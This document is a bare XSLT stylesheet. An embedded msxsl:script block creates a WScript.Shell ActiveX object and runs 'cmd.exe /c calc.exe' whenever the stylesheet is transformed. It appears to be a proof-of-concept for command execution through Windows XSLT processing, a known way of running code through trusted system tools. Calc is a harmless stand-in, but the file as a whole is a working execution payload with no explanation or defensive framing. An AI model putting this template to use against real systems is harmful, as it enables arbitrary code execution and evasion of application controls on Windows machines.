<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
    <msxsl:script language="JScript" implements-prefix="user">
        <![CDATA[
        function execute() {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c calc.exe");
        }
        ]]>
    </msxsl:script>
    <xsl:template match="/">
        <xsl:value-of select="user:execute()"/>
    </xsl:template>
</xsl:stylesheet>